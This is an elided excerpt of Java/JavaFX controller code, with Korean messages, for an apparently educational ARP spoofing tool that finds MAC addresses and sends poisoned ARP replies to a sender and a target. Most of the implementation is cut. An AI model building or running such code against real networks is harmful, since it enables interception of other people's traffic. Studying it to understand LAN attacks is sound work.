...
public class Controller implements Initializable {
    ...
    ObservableList<String> networkLsit = FXCollections.observableArrayList();
    ...
    public void initialize(URL location, ResourceBundle resources){
        ...
        int r = Pcap.findAllDevs(allDevs,errbuffer);
        ...
        {
            networkLsit.add(device.getName()+" "+
                    ((device.getDescription() !=null)?device.getDescription(): "설명 없음"));
        }
        networkListView.setItems(networkLsit);
    }
    ...
    public void getMACAction() {
        if(!pickButton.isDisable()){
            textArea.appendText("네트워크 장비를 먼저 선태해주세요\n");
            return;
        }
...
// 타깃 ARP
        ...
        textArea.appendText("타깃에게 ARP Request를 보냈습니다.\n"+ Util.bytesToString(arp.getPacket())+"\n");
        ...
        while (Main.pcap.nextEx(header,buf) != Pcap.NEXT_EX_NOT_OK)
        {
            ...
            System.out.println("패킷 스티일 출력하기" + packet.toString());
        ...
        textArea.appendText("Sender에게 ARP Request를 보냈습니다.\n"+ Util.bytesToString(arp.getPacket())+"\n");
        ...
        textArea.appendText("타겟 맥 주소: "+ Util.bytesToString(Main.senderMAC) + "\n");
    ...
    class SenderARPSpoofing extends Thread {
        ...
        public void run(){
            ...
            Platform.runLater(()->{
                textArea.appendText("센더에게 감염된 ARP Reply 패킷을  \n");
            });
    ...
    class TargetARPSpoofing extends Thread {
        ...
        public void run(){
            ...
            Platform.runLater(()->{
                textArea.appendText("타겟에게 감염된 ARP Reply 패킷을 전송합니다 \n");
            });
        ...
        public  void run()
         {
             ...
             while(Main.pcap.nextEx(header,buf)!= Pcap.NEXT_EX_NOT_OK){
                 ...
                 if(Main.pcap.nextEx(header,buf)!=Pcap.NEXT_EX_OK)
                 {
                     continue;
                 }
